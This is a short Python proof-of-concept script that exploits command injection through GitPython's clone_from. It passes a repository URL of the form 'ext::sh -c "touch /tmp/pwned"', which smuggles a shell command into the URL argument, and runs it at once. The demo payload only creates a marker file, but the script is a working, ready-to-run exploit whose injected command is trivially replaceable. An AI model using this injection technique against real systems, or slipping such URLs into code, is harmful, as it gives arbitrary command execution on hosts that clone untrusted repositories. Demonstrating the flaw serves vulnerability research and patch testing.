from git import Repo
import os
import shutil
import tempfile

# Vulnerable code - could allow RCE via malicious input
def clone_repository(malicious_url):
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()

    try:
        # Initialize a bare repository
        r = Repo.init(temp_dir, bare=True)

        # Clone from a potentially malicious URL
        try:
            r.clone_from(malicious_url, 'tmp')
        except Exception as e:
            print(f"Error cloning repository: {e}")
    finally:
        # Remove the temporary directory and its contents
       shutil.rmtree(temp_dir)


# Example of a malicious URL that could exploit the vulnerability
malicious_url = 'ext::sh -c "touch /tmp/pwned"'
clone_repository(malicious_url)